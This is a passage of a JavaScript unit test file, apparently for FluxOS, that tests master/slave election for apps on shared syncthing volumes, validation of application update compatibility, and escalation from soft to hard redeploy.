      const logInfo = sinon.stub(log, 'info');
      const runPass = electionFixture(
        appName,
        ['192.168.1.90:16127'],
        { selfRunningSince: '2026-01-01T00:02:00.000Z' },
      );
      serviceHelperStub.resolves(fdmNoPrimary());
      const clock = sinon.useFakeTimers({ now: Date.now(), toFake: ['Date'] });

      axiosGetStub.resetBehavior();
      axiosGetStub.callsFake(peerAnswers({ held: [] }));
      await runPass();
      expect(linesMatching(logInfo, 'scheduling app')).to.have.lengthOf(1);

      clock.tick(config.fluxapps.masterSlaveStaggerMs);
      logInfo.resetHistory();
      axiosGetStub.resetBehavior();
      // Only the node ahead is asked, and it is free - so this node takes the primary.
      axiosGetStub.callsFake(peerAnswers({ held: [] }));
      await runPass();

      expect(linesMatching(logInfo, 'starting docker component')).to.have.lengthOf(1);
    });

    // The test above cannot actually see the scope. With ONE peer, 'lower' and
    // 'all' probe the same single node, so "asked the node ahead" and "asked
    // everybody" are observationally identical and the escalation could become
    // unconditional without a test noticing. This node sits at index 1 with a
    // peer on either side, and only the one BELOW it should be asked.
    //
    // What it costs if the scope escalates: every staggered due-turn becomes a
    // fleet-wide probe, at election cadence, on every node running the app.
    it('asks only the node ahead on a due stagger, not every instance', async () => {
      const appName = 'duestaggerscopeapp';
      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
      const logInfo = sinon.stub(log, 'info');
      const runPass = electionFixture(
        appName,
        ['192.168.1.90:16127', '192.168.1.91:16127'],
        { selfRunningSince: '2026-01-01T00:01:30.000Z' },
      );
      serviceHelperStub.resolves(fdmNoPrimary());
      const clock = sinon.useFakeTimers({ now: Date.now(), toFake: ['Date'] });

      // Ordered by runningSince: .90 (00:01) is index 0, this node (00:01:30) is
      // index 1, .91 (00:02) is index 2. The node ABOVE holds the component; a
      // lower-only probe never asks it, an escalated one does.
      const answerByPeer = (url) => {
        if (url.includes('/apps/heldcomponents')) {
          const held = url.includes('192.168.1.91') ? [`flux${appName}`] : [];
          return Promise.resolve({ data: { data: held } });
        }
        return Promise.resolve({ data: { data: [] } });
      };

      axiosGetStub.resetBehavior();
      axiosGetStub.callsFake(answerByPeer);
      await runPass();
      expect(linesMatching(logInfo, 'scheduling app')).to.have.lengthOf(1);

      clock.tick(config.fluxapps.masterSlaveStaggerMs);
      logInfo.resetHistory();
      axiosGetStub.resetBehavior();
      axiosGetStub.callsFake(answerByPeer);
      await runPass();

      expect(
        linesMatching(logInfo, 'starting docker component'),
        'did not start - a node ABOVE this one was probed, so the scope escalated past the stagger',
      ).to.have.lengthOf(1);
      clock.restore();
    });

    // index is re-derived from the location list on every pass, so a node that
    // booked a stagger can find itself ABSENT from that list when its turn comes
    // - the instances ahead aged out, or its own row lapsed. index is then -1, and
    // a lower-only walk of "everyone below index -1" asks NOBODY, which the caller
    // reads as clear. That is a blind start onto a shared volume, reached from the
    // staggered path rather than the index-0 one.
    it('escalates rather than starting blind when this node has left the location list', async () => {
      const appName = 'droppedoutapp';
      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
      const logInfo = sinon.stub(log, 'info');
      const runPass = electionFixture(
        appName,
        ['192.168.1.90:16127', '192.168.1.91:16127'],
        { selfRunningSince: '2026-01-01T00:03:00.000Z' },
      );
      serviceHelperStub.resolves(fdmNoPrimary());
      const clock = sinon.useFakeTimers({ now: Date.now(), toFake: ['Date'] });

      // Pass 1: this node is index 2 and books its stagger.
      axiosGetStub.resetBehavior();
      axiosGetStub.callsFake(peerAnswers({ held: [] }));
      await runPass();
      expect(linesMatching(logInfo, 'scheduling app')).to.have.lengthOf(1);

      // The turn arrives, and by now this node is no longer in the list at all.
      clock.tick(config.fluxapps.masterSlaveStaggerMs * 3);
      registryManagerStub.resolves([
        { name: appName, ip: '192.168.1.90:16127', runningSince: '2026-01-01T00:01:00.000Z' },
        { name: appName, ip: '192.168.1.91:16127', runningSince: '2026-01-01T00:02:00.000Z' },
      ]);
      logInfo.resetHistory();
      axiosGetStub.resetBehavior();
      // A peer IS running it. Escalating finds that; asking nobody does not.
      axiosGetStub.callsFake(peerAnswers({ held: [`flux${appName}`] }));
      await runPass();

      expect(
        linesMatching(logInfo, 'starting docker component'),
        'started without asking anyone - a second writer on the shared volume',
      ).to.have.lengthOf(0);
      clock.restore();
    });

    it('takes the per-place stagger from config, not from a literal', async () => {
      // Four call sites computed the wait from `index * 3 * 60 * 1000`, which is why
      // no harness suite exercises a staggered start: reaching one costs minutes of
      // wall clock, so the whole class went uncovered at rig level.
      //
      // Asserted to the millisecond against the CONFIGURED value, and the unit
      // config deliberately differs from the code's fallback - otherwise a
      // misspelled key would default to the same 3 minutes and read as wired.
      const appName = 'staggerconfigapp';
      const stagger = config.fluxapps.masterSlaveStaggerMs;
      expect(stagger, 'unit config must differ from the fallback or this proves nothing').to.not.equal(3 * 60 * 1000);
      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
      const logInfo = sinon.stub(log, 'info');
      const runPass = electionFixture(
        appName,
        ['192.168.1.90:16127'],
        { selfRunningSince: '2026-01-01T00:02:00.000Z' },
      );
      serviceHelperStub.resolves(fdmNoPrimary());
      axiosGetStub.resetBehavior();
      axiosGetStub.callsFake(peerAnswers({ held: [] }));
      const clock = sinon.useFakeTimers({ now: Date.now(), toFake: ['Date'] });

      // Index 1, no history: one place of wait.
      await runPass();
      expect(linesMatching(logInfo, 'scheduling app')).to.have.lengthOf(1);

      // One millisecond short: still not this node's turn.
      clock.tick(stagger - 1);
      logInfo.resetHistory();
      await runPass();
      expect(linesMatching(logInfo, 'starting docker component')).to.have.lengthOf(0);

      // And due on the millisecond the configured wait elapses.
      clock.tick(1);
      logInfo.resetHistory();
      await runPass();
      expect(linesMatching(logInfo, 'starting docker component')).to.have.lengthOf(1);
    });

    it('keeps the seed claim when a peer cannot be ruled out, rather than spending it on a non-answer', async () => {
      // The claim is what the seed decision is made FROM, and no decision was
      // reached. Spending it here drops this node to the index stagger on no
      // evidence - the exact wait the claim exists to remove, given up because a
      // peer did not answer.
      const appName = 'seedheldapp';
      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
      const logInfo = sinon.stub(log, 'info');
      const appId = `flux${appName}`;
      const cache = new Map([[appId, { restarted: true, designatedLeader: true }]]);
      const runPass = electionFixture(
        appName,
        ['192.168.1.90:16127', '192.168.1.91:16127'],
        { selfRunningSince: '2026-01-01T00:02:30.000Z', receiveOnlyCache: cache },
      );
      serviceHelperStub.resolves(fdmNoPrimary());
      // both peers silent, and this node has no view of either

      await runPass();

      expect(linesMatching(logInfo, 'holding the seed')).to.have.lengthOf(1);
      expect(linesMatching(logInfo, 'starting docker component')).to.have.lengthOf(0);
      expect(cache.get(appId).designatedLeader).to.equal(true);
    });

    it('keeps the component when the previous primary is silent and its sync connection is still alive', async () => {
      // FDM dropping a primary is not evidence that it stopped - its registration
      // lags reality in both directions. The remembered primary is the instance most
      // likely to still hold the volume, so a silence there keeps the component
      // rather than releasing it to an election.
      const appName = 'prevprimaryapp';
      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
      const logInfo = sinon.stub(log, 'info');
      const runPass = electionFixture(appName, ['192.168.1.90:16127']);

      // Cycle 1: FDM names the PEER, so this node records it as the previous primary.
      serviceHelperStub.resetBehavior();
      serviceHelperStub.resolves({ data: { status: 'success', data: { ips: ['192.168.1.90'] } } });
      axiosGetStub.resetBehavior();
      axiosGetStub.callsFake(peerAnswers({ held: [] }));
      await runPass();
      logInfo.resetHistory();

      // Cycle 2: FDM reports no primary and the peer has gone silent - but its
      // syncthing connection to this node is still open, so it is restarting.
      serviceHelperStub.resetBehavior();
      serviceHelperStub.resolves(fdmNoPrimary());
      axiosGetStub.resetBehavior();
      axiosGetStub.rejects(new Error('previous primary unreachable'));
      peerSyncthingSays('192.168.1.90:16127', 'valid');

      await runPass();

      expect(linesMatching(logInfo, 'still holds a live connection to it')).to.have.lengthOf(1);
      expect(linesMatching(logInfo, 'starting docker component')).to.have.lengthOf(0);
    });

    it('keeps electing later g: apps when an earlier one is still held by its previous master', async () => {
      // Two g: apps on one node. The first is settled - its previous master (the
      // peer) still holds it, so there is nothing to elect. That must not cost the
      // SECOND app its cycle. Abandoning the pass here is invisible in the logs,
      // which is the failure this whole area keeps producing.
      const first = 'starvedfirst';
      const second = 'starvedsecond';
      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
      const logInfo = sinon.stub(log, 'info');

      dockerServiceStub.callsFake((name) => `flux${name}`);
      const installedApps = sinon.stub().resolves({
        status: 'success',
        data: [
          { name: first, version: 3, containerData: 'g:/syncdata' },
          { name: second, version: 3, containerData: 'g:/syncdata' },
        ],
      });
      const listRunningApps = sinon.stub().resolves({ status: 'success', data: [] });
      globalState.receiveOnlySyncthingAppsCache.set(`flux${first}`, { restarted: true });
      globalState.receiveOnlySyncthingAppsCache.set(`flux${second}`, { restarted: true });
      fluxNetworkHelperStub.resolves('192.168.1.5:16127');
      // This node is index 0 for both, so the second app is startable the moment
      // it is reached - which makes "was it reached?" unambiguous.
      registryManagerStub.callsFake(async (name) => [
        { name, ip: '192.168.1.5:16127', runningSince: '2026-01-01T00:00:00.000Z' },
        { name, ip: '192.168.1.90:16127', runningSince: '2026-01-01T00:01:00.000Z' },
      ]);
      syncthingServiceStub.resolves({
        status: 'success',
        data: [
          { path: `/root/.flux/ZelApps/flux${first}`, type: 'sendreceive' },
          { path: `/root/.flux/ZelApps/flux${second}`, type: 'sendreceive' },
        ],
      });

      let delayCalls = 0;
      serviceHelperDelayStub.resetBehavior();
      serviceHelperDelayStub.callsFake(async () => {
        delayCalls += 1;
        if (delayCalls === 1) {
          globalState.installationInProgress = true;
          return undefined;
        }
        return new Promise(() => {});
      });
      const runPass = async () => {
        delayCalls = 0;
        globalState.installationInProgress = false;
        await advancedWorkflows.masterSlaveApps(
          globalState, installedApps, listRunningApps, require('https'),
        );
      };

      // Cycle 1: FDM names the PEER as primary for both, so this node records it
      // as the previous master for each.
      serviceHelperStub.resetBehavior();
      serviceHelperStub.resolves({ data: { status: 'success', data: { ips: ['192.168.1.90'] } } });
      await runPass();
      logInfo.resetHistory();

      // Cycle 2: FDM reports no primary for either. The peer answers, and holds the
      // FIRST component only - so app one is settled and app two is free.
      serviceHelperStub.resetBehavior();
      serviceHelperStub.resolves(fdmNoPrimary());
      axiosGetStub.resetBehavior();
      axiosGetStub.callsFake(peerAnswers({ held: [`flux${first}`] }));

      await runPass();

      expect(linesMatching(logInfo, `component:${first} is held on peer node (previous primary)`)).to.have.lengthOf(1);
      // the assertion that discriminates: the pass carried on to the second app
      expect(linesMatching(logInfo, `starting docker component:${second}`)).to.have.lengthOf(1);
    });

    it('should handle apps with g: containerData (master-slave mode)', async () => {
      const appName = 'masterslaveapp';
      dockerServiceStub.returns('zel_masterslaveapp');

      const installedApps = sinon.stub().resolves({
        status: 'success',
        data: [
          {
            name: appName,
            version: 3,
            containerData: 'g:/syncdata',
          },
        ],
      });
      const listRunningApps = sinon.stub().resolves({
        status: 'success',
        data: [],
      });

      globalState.receiveOnlySyncthingAppsCache.set('zel_masterslaveapp', { restarted: true });
      const https = require('https');

      // Mock FDM responses (no IP)
      serviceHelperStub.resolves(fdmNoPrimary());

      // Mock node IP
      fluxNetworkHelperStub.resolves('192.168.1.5:16127');

      // Mock running app list - this node is at index 0
      registryManagerStub.resolves([
        {
          name: appName,
          ip: '192.168.1.5:16127',
          runningSince: null,
        },
        {
          name: appName,
          ip: '192.168.1.10:16127',
          runningSince: null,
        },
      ]);

      // Mock syncthing folder check
      syncthingServiceStub.resolves({
        status: 'success',
        data: [
          {
            path: '/root/.flux/ZelApps/zel_masterslaveapp',
            type: 'sendreceive',
          },
        ],
      });

      // This should attempt to start the app since this node is at index 0
      await advancedWorkflows.masterSlaveApps(
        globalState,
        installedApps,
        listRunningApps,
        https,
      );

      // Verify FDM was queried
      expect(serviceHelperStub.called).to.be.true;
    });

    it('should schedule non-index-0 nodes when no FDM IP and no history', async () => {
      const appName = 'masterslaveapp';
      dockerServiceStub.returns('zel_masterslaveapp');

      const installedApps = sinon.stub().resolves({
        status: 'success',
        data: [
          {
            name: appName,
            version: 3,
            containerData: 'g:/syncdata',
          },
        ],
      });
      const listRunningApps = sinon.stub().resolves({
        status: 'success',
        data: [],
      });

      globalState.receiveOnlySyncthingAppsCache.set('zel_masterslaveapp', { restarted: true });
      const https = require('https');

      // Mock FDM responses (no IP)
      serviceHelperStub.resolves(fdmNoPrimary());

      // Mock node IP - this node is at index 1 (second in list)
      fluxNetworkHelperStub.resolves('192.168.1.10:16127');

      // Mock running app list - sorted by IP
      registryManagerStub.resolves([
        {
          name: appName,
          ip: '192.168.1.5:16127',
          runningSince: null,
        },
        {
          name: appName,
          ip: '192.168.1.10:16127', // This node
          runningSince: null,
        },
      ]);

      // Mock syncthing folder check
      syncthingServiceStub.resolves({
        status: 'success',
        data: [
          {
            path: '/root/.flux/ZelApps/zel_masterslaveapp',
            type: 'sendreceive',
          },
        ],
      });

      await advancedWorkflows.masterSlaveApps(
        globalState,
        installedApps,
        listRunningApps,
        https,
      );

      // Node at index 1 should schedule start for 3 minutes later, not start immediately
      // This is verified by the function logic - it should NOT call appDockerRestart immediately
      expect(serviceHelperStub.called).to.be.true;
      expect(fluxNetworkHelperStub.called).to.be.true;
    });

    it('stops only the g: component on a standby node, leaving non-g siblings running', async () => {
      const appName = 'n8napp';
      const dockerService = require('../../ZelBack/src/services/dockerService');
      dockerServiceStub.returns('fluxn8n_n8napp');
      const appDockerStopStub = sinon.stub(dockerService, 'appDockerStop').resolves();
      // post-inversion, a standby records desired-stopped through the reconciler seam
      const appReconciler = require('../../ZelBack/src/services/appMonitoring/appReconciler');
      const setControllerDesiredStub = sinon.stub(appReconciler, 'setControllerDesired');

      // Mixed compose app: n8n uses g: master/slave, pgcluster needs all instances running
      const installedApps = sinon.stub().resolves({
        status: 'success',
        data: [
          {
            name: appName,
            version: 8,
            compose: [
              { name: 'n8n', containerData: 'g:/home/node/.n8n' },
              { name: 'pgcluster', containerData: '/var/lib/postgresql/data' },
            ],
          },
        ],
      });
      // Both components currently running on this node
      const listRunningApps = sinon.stub().resolves({
        status: 'success',
        data: [
          { Names: ['/fluxn8n_n8napp'] },
          { Names: ['/fluxpgcluster_n8napp'] },
        ],
      });

      const https = require('https');

      // FDM reports the primary is another node
      serviceHelperStub.resolves({ data: { status: 'success', data: { ips: ['192.168.1.99'] } } });
      // This node's address differs from the FDM primary -> we are a standby
      fluxNetworkHelperStub.resolves('192.168.1.5:16127');

      await advancedWorkflows.masterSlaveApps(
        globalState,
        installedApps,
        listRunningApps,
        https,
      );

      // masterSlaveApps' job here is the election DECISION: it must declare the g:
      // component desired-stopped (with the standby reason) and touch nothing else.
      // Actuation is the reconciler's job (covered in appReconciler.test.js), so it
      // must NOT call appDockerStop directly.
      expect(setControllerDesiredStub.calledWith('n8n_n8napp', 'stopped', 'masterSlave standby')).to.be.true;
      expect(setControllerDesiredStub.neverCalledWith('pgcluster_n8napp')).to.be.true;
      expect(setControllerDesiredStub.neverCalledWith(appName)).to.be.true;
      expect(appDockerStopStub.called).to.be.false;
    });

    it('does not stop anything on a standby node when the g: component is already stopped', async () => {
      const appName = 'n8napp';
      const dockerService = require('../../ZelBack/src/services/dockerService');
      dockerServiceStub.returns('fluxn8n_n8napp');
      const appDockerStopStub = sinon.stub(dockerService, 'appDockerStop').resolves();

      const installedApps = sinon.stub().resolves({
        status: 'success',
        data: [
          {
            name: appName,
            version: 8,
            compose: [
              { name: 'n8n', containerData: 'g:/home/node/.n8n' },
              { name: 'pgcluster', containerData: '/var/lib/postgresql/data' },
            ],
          },
        ],
      });
      // Steady state on a standby: only the non-g component is running
      const listRunningApps = sinon.stub().resolves({
        status: 'success',
        data: [
          { Names: ['/fluxpgcluster_n8napp'] },
        ],
      });

      const https = require('https');

      // FDM reports the primary is another node
      serviceHelperStub.resolves({ data: { status: 'success', data: { ips: ['192.168.1.99'] } } });
      fluxNetworkHelperStub.resolves('192.168.1.5:16127');

      await advancedWorkflows.masterSlaveApps(
        globalState,
        installedApps,
        listRunningApps,
        https,
      );

      // The g: component is not running here and we are not primary - nothing to stop.
      // The running pgcluster sibling must be left alone.
      expect(appDockerStopStub.called).to.be.false;
    });

    it('does NOT stop its own container when it is the primary on a UPnP (non-default) port', async () => {
      // Regression: FDM returns a bare master IP (production format). A UPnP node (e.g.
      // :16157) that IS the primary must recognise itself and keep running. The pre-fix
      // code compared with socketAddressesMatch, which normalized the bare IP to :16127,
      // failed to match its own :16157 socket, and repeatedly stopped its own container
      // (start/stop flap loop). ipsMatch compares on IP only, so it matches.
      const appName = 'valheim1777035136949';
      const dockerService = require('../../ZelBack/src/services/dockerService');
      dockerServiceStub.returns('fluxvalheim_valheim1777035136949');
      const appDockerStopStub = sinon.stub(dockerService, 'appDockerStop').resolves();

      // Compose app with a g: component so the identifier is component_app: this makes the
      // (mistaken) stop call hit dockerService.appDockerStop directly, so the assertion
      // actually observes the bug if it regresses.
      const installedApps = sinon.stub().resolves({
        status: 'success',
        data: [
          {
            name: appName,
            version: 8,
            compose: [
              { name: 'valheim', containerData: 'g:/root/.config/valheim' },
            ],
          },
        ],
      });
      // The g: component is currently running on this node (it is the primary).
      const listRunningApps = sinon.stub().resolves({
        status: 'success',
        data: [
          { Names: ['/fluxvalheim_valheim1777035136949'] },
        ],
      });

      const https = require('https');

      // FDM returns a bare IP (current production behavior - no FDM change required).
      serviceHelperStub.resolves({ data: { status: 'success', data: { ips: ['90.228.196.203'] } } });
      // This node's API socket is on a non-default UPnP port at the same IP -> we are the primary.
      fluxNetworkHelperStub.resolves('90.228.196.203:16157');

      await advancedWorkflows.masterSlaveApps(
        globalState,
        installedApps,
        listRunningApps,
        https,
      );

      // We are the primary - the container must be left running, never stopped.
      expect(appDockerStopStub.called).to.be.false;
    });

    it('stops the g: component on a UPnP standby when FDM names a different primary IP', async () => {
      // Guards the inverse: a genuine standby (different IP, itself on a non-default port)
      // must still be detected and stopped - ipsMatch must not over-match across IPs.
      const appName = 'n8napp';
      const dockerService = require('../../ZelBack/src/services/dockerService');
      dockerServiceStub.returns('fluxn8n_n8napp');
      const appDockerStopStub = sinon.stub(dockerService, 'appDockerStop').resolves();
      const appReconciler = require('../../ZelBack/src/services/appMonitoring/appReconciler');
      const setControllerDesiredStub = sinon.stub(appReconciler, 'setControllerDesired');

      const installedApps = sinon.stub().resolves({
        status: 'success',
        data: [
          {
            name: appName,
            version: 8,
            compose: [
              { name: 'n8n', containerData: 'g:/home/node/.n8n' },
              { name: 'pgcluster', containerData: '/var/lib/postgresql/data' },
            ],
          },
        ],
      });
      const listRunningApps = sinon.stub().resolves({
        status: 'success',
        data: [
          { Names: ['/fluxn8n_n8napp'] },
          { Names: ['/fluxpgcluster_n8napp'] },
        ],
      });

      const https = require('https');

      // FDM primary is a different node, returned as a bare IP (production format).
      serviceHelperStub.resolves({ data: { status: 'success', data: { ips: ['192.168.1.99'] } } });
      // This node has a different IP (and its own non-default port) -> we are a standby.
      fluxNetworkHelperStub.resolves('192.168.1.5:16137');

      await advancedWorkflows.masterSlaveApps(
        globalState,
        installedApps,
        listRunningApps,
        https,
      );

      // The standby's g: component is declared desired-stopped through the reconciler
      // seam; the non-g sibling is untouched and Docker is not actuated directly here.
      expect(setControllerDesiredStub.calledWith('n8n_n8napp', 'stopped', 'masterSlave standby')).to.be.true;
      expect(setControllerDesiredStub.neverCalledWith('pgcluster_n8napp')).to.be.true;
      expect(appDockerStopStub.called).to.be.false;
    });
  });

  describe('validateApplicationUpdateCompatibility tests', () => {
    it('should allow component count changes for version 8+ apps', async () => {
      const oldAppSpecs = {
        name: 'TestApp',
        description: 'Test application',
        owner: 'testowner',
        version: 8,
        instances: 3,
        contacts: [],
        geolocation: [],
        expire: 10000,
        nodes: [],
        staticip: false,
        enterprise: '',
        compose: [
          { name: 'frontend', repotag: 'repo/frontend:1.0', ports: ['8080'], containerPorts: ['8080'], domains: [], environmentParameters: [], commands: [] },
          { name: 'backend', repotag: 'repo/backend:1.0', ports: ['3000'], containerPorts: ['3000'], domains: [], environmentParameters: [], commands: [] },
        ],
      };

      const newAppSpecs = {
        name: 'TestApp',
        description: 'Test application',
        owner: 'testowner',
        version: 8,
        instances: 3,
        contacts: [],
        geolocation: [],
        expire: 10000,
        nodes: [],
        staticip: false,
        enterprise: '',
        compose: [
          { name: 'frontend', repotag: 'repo/frontend:1.0', ports: ['8080'], containerPorts: ['8080'], domains: [], environmentParameters: [], commands: [] },
          { name: 'backend', repotag: 'repo/backend:1.0', ports: ['3000'], containerPorts: ['3000'], domains: [], environmentParameters: [], commands: [] },
          { name: 'database', repotag: 'repo/database:1.0', ports: ['5432'], containerPorts: ['5432'], domains: [], environmentParameters: [], commands: [] },
        ],
      };

      // Should not throw error for v8+ apps with component changes
      const result = await advancedWorkflows.validateApplicationUpdateCompatibility(
        newAppSpecs,
        oldAppSpecs,
      );

      expect(result).to.be.true;
    });

    it('should allow component name changes for version 8+ apps', async () => {
      const oldAppSpecs = {
        name: 'TestApp',
        description: 'Test application',
        owner: 'testowner',
        version: 8,
        instances: 3,
        contacts: [],
        geolocation: [],
        expire: 10000,
        nodes: [],
        staticip: false,
        enterprise: '',
        compose: [
          { name: 'frontend', repotag: 'repo/frontend:1.0', ports: ['8080'], containerPorts: ['8080'], domains: [], environmentParameters: [], commands: [] },
          { name: 'backend', repotag: 'repo/backend:1.0', ports: ['3000'], containerPorts: ['3000'], domains: [], environmentParameters: [], commands: [] },
        ],
      };

      const newAppSpecs = {
        name: 'TestApp',
        description: 'Test application',
        owner: 'testowner',
        version: 8,
        instances: 3,
        contacts: [],
        geolocation: [],
        expire: 10000,
        nodes: [],
        staticip: false,
        enterprise: '',
        compose: [
          { name: 'frontend', repotag: 'repo/frontend:1.0', ports: ['8080'], containerPorts: ['8080'], domains: [], environmentParameters: [], commands: [] },
          { name: 'api', repotag: 'repo/api:1.0', ports: ['3000'], containerPorts: ['3000'], domains: [], environmentParameters: [], commands: [] }, // Renamed from 'backend' to 'api'
        ],
      };

      // Should not throw error for v8+ apps with component name changes
      const result = await advancedWorkflows.validateApplicationUpdateCompatibility(
        newAppSpecs,
        oldAppSpecs,
      );

      expect(result).to.be.true;
    });

    it('should reject component count changes for version 4-7 apps', async () => {
      const oldAppSpecs = {
        name: 'TestApp',
        description: 'Test application',
        owner: 'testowner',
        version: 7,
        instances: 3,
        contacts: [],
        geolocation: [],
        expire: 10000,
        nodes: [],
        staticip: false,
        repoAuth: '',
        compose: [
          { name: 'frontend', repotag: 'repo/frontend:1.0', ports: ['8080'], containerPorts: ['8080'], domains: [], environmentParameters: [], commands: [], tiered: false },
          { name: 'backend', repotag: 'repo/backend:1.0', ports: ['3000'], containerPorts: ['3000'], domains: [], environmentParameters: [], commands: [], tiered: false },
        ],
      };

      const newAppSpecs = {
        name: 'TestApp',
        description: 'Test application',
        owner: 'testowner',
        version: 7,
        instances: 3,
        contacts: [],
        geolocation: [],
        expire: 10000,
        nodes: [],
        staticip: false,
        repoAuth: '',
        compose: [
          { name: 'frontend', repotag: 'repo/frontend:1.0', ports: ['8080'], containerPorts: ['8080'], domains: [], environmentParameters: [], commands: [], tiered: false },
          { name: 'backend', repotag: 'repo/backend:1.0', ports: ['3000'], containerPorts: ['3000'], domains: [], environmentParameters: [], commands: [], tiered: false },
          { name: 'database', repotag: 'repo/database:1.0', ports: ['5432'], containerPorts: ['5432'], domains: [], environmentParameters: [], commands: [], tiered: false },
        ],
      };

      // Should throw error for v4-7 apps with component count changes
      try {
        await advancedWorkflows.validateApplicationUpdateCompatibility(
          newAppSpecs,
          oldAppSpecs,
        );
        expect.fail('Should have thrown error');
      } catch (error) {
        expect(error.message).to.include('Cannot change the number of components');
        expect(error.message).to.include('v4-7 applications');
        expect(error.message).to.include('Upgrade to version 8');
      }
    });

    it('should reject component name changes for version 4-7 apps', async () => {
      const oldAppSpecs = {
        name: 'TestApp',
        description: 'Test application',
        owner: 'testowner',
        version: 6,
        instances: 3,
        contacts: [],
        geolocation: [],
        expire: 10000,
        nodes: [],
        staticip: false,
        repoAuth: '',
        compose: [
          { name: 'frontend', repotag: 'repo/frontend:1.0', ports: ['8080'], containerPorts: ['8080'], domains: [], environmentParameters: [], commands: [], tiered: false },
          { name: 'backend', repotag: 'repo/backend:1.0', ports: ['3000'], containerPorts: ['3000'], domains: [], environmentParameters: [], commands: [], tiered: false },
        ],
      };

      const newAppSpecs = {
        name: 'TestApp',
        description: 'Test application',
        owner: 'testowner',
        version: 6,
        instances: 3,
        contacts: [],
        geolocation: [],
        expire: 10000,
        nodes: [],
        staticip: false,
        repoAuth: '',
        compose: [
          { name: 'frontend', repotag: 'repo/frontend:1.0', ports: ['8080'], containerPorts: ['8080'], domains: [], environmentParameters: [], commands: [], tiered: false },
          { name: 'api', repotag: 'repo/api:1.0', ports: ['3000'], containerPorts: ['3000'], domains: [], environmentParameters: [], commands: [], tiered: false }, // Renamed from 'backend'
        ],
      };

      // Should throw error for v4-7 apps with component name changes
      try {
        await advancedWorkflows.validateApplicationUpdateCompatibility(
          newAppSpecs,
          oldAppSpecs,
        );
        expect.fail('Should have thrown error');
      } catch (error) {
        expect(error.message).to.include('Component "backend" not found');
        expect(error.message).to.include('v4-7 applications');
        expect(error.message).to.include('Upgrade to version 8');
      }
    });

    it('should allow version changes (policy enforced elsewhere)', async () => {
      const oldAppSpecs = {
        name: 'TestApp',
        version: 5,
        compose: [
          { name: 'app', repotag: 'repo/app:1.0', ports: ['8080'], containerPorts: ['8080'], domains: [], environmentParameters: [], commands: [], tiered: false },
        ],
      };

      const newAppSpecs = {
        name: 'TestApp',
        version: 6,
        compose: [
          { name: 'app', repotag: 'repo/app:1.0', ports: ['8080'], containerPorts: ['8080'], domains: [], environmentParameters: [], commands: [], tiered: false },
        ],
      };

      // validateApplicationUpdateCompatibility no longer enforces version upgrade policy —
      // that is now handled in storeAppTemporaryMessage. Structural compatibility should pass.
      const result = await advancedWorkflows.validateApplicationUpdateCompatibility(
        newAppSpecs,
        oldAppSpecs,
      );

      expect(result).to.be.true;
    });

    it('should allow repotag changes for all v4+ apps', async () => {
      const oldAppSpecs = {
        name: 'TestApp',
        description: 'Test application',
        owner: 'testowner',
        version: 7,
        instances: 3,
        contacts: [],
        geolocation: [],
        expire: 10000,
        nodes: [],
        staticip: false,
        repoAuth: '',
        compose: [
          { name: 'frontend', repotag: 'repo/frontend:1.0', ports: ['8080'], containerPorts: ['8080'], domains: [], environmentParameters: [], commands: [], tiered: false },
          { name: 'backend', repotag: 'repo/backend:1.0', ports: ['3000'], containerPorts: ['3000'], domains: [], environmentParameters: [], commands: [], tiered: false },
        ],
      };

      const newAppSpecs = {
        name: 'TestApp',
        description: 'Test application',
        owner: 'testowner',
        version: 7,
        instances: 3,
        contacts: [],
        geolocation: [],
        expire: 10000,
        nodes: [],
        staticip: false,
        repoAuth: '',
        compose: [
          { name: 'frontend', repotag: 'repo/frontend:2.0', ports: ['8080'], containerPorts: ['8080'], domains: [], environmentParameters: [], commands: [], tiered: false }, // Changed tag
          { name: 'backend', repotag: 'repo/backend:2.0', ports: ['3000'], containerPorts: ['3000'], domains: [], environmentParameters: [], commands: [], tiered: false }, // Changed tag
        ],
      };

      // Should allow repotag changes for v4+ apps
      const result = await advancedWorkflows.validateApplicationUpdateCompatibility(
        newAppSpecs,
        oldAppSpecs,
      );

      expect(result).to.be.true;
    });
  });

  describe('softRedeploy component structure change handling tests', () => {
    let findInDatabaseStub;

    beforeEach(() => {
      // Reset global state
      // eslint-disable-next-line global-require
      const globalState = require('../../ZelBack/src/services/utils/globalState');
      globalState.removalInProgress = false;
      globalState.installationInProgress = false;
      globalState.softRedeployInProgress = false;
      globalState.hardRedeployInProgress = false;

      // Setup database connection stub
      sinon.stub(dbHelper, 'databaseConnection').returns({
        db: () => ({}),
      });
    });

    afterEach(() => {
      sinon.restore();
    });

    it('should escalate to hard redeploy when component count changes for v8+ app', async () => {
      const installedApp = {
        name: 'TestApp',
        version: 8,
        compose: [
          { name: 'frontend', repotag: 'repo/frontend:1.0' },
          { name: 'backend', repotag: 'repo/backend:1.0' },
        ],
      };

      const newAppSpecs = {
        name: 'TestApp',
        version: 8,
        compose: [
          { name: 'frontend', repotag: 'repo/frontend:1.0' },
          { name: 'backend', repotag: 'repo/backend:1.0' },
          { name: 'database', repotag: 'repo/database:1.0' },
        ],
      };

      // Stub dbHelper.findInDatabase to return the installed app
      findInDatabaseStub = sinon.stub(dbHelper, 'findInDatabase').resolves([installedApp]);

      // Stub appUninstaller so hardRedeploy doesn't actually try to remove the app
      // eslint-disable-next-line global-require
      const appUninstaller = require('../../ZelBack/src/services/appLifecycle/appUninstaller');
      sinon.stub(appUninstaller, 'removeAppLocally').resolves();

      // Stub appInstaller so hardRedeploy doesn't actually try to install the app
      // eslint-disable-next-line global-require
      const appInstaller = require('../../ZelBack/src/services/appLifecycle/appInstaller');
      sinon.stub(appInstaller, 'checkAppRequirements').resolves();
      sinon.stub(appInstaller, 'registerAppLocally').resolves();

      // Stub serviceHelper.delay so hardRedeploy doesn't wait
      // eslint-disable-next-line global-require
      const serviceHelper = require('../../ZelBack/src/services/serviceHelper');
      sinon.stub(serviceHelper, 'delay').resolves();

      // Create a mock response object
      const res = {
        write: sinon.stub(),
        flush: sinon.stub(),
        end: sinon.stub(),
      };

      await advancedWorkflows.softRedeploy(newAppSpecs, res);

      // Should have called dbHelper.findInDatabase to check for structure changes
      expect(findInDatabaseStub.called).to.be.true;

      // Should have written escalation message to response
      expect(res.write.called).to.be.true;
      const messages = res.write.getCalls().map(call => call.args[0]);
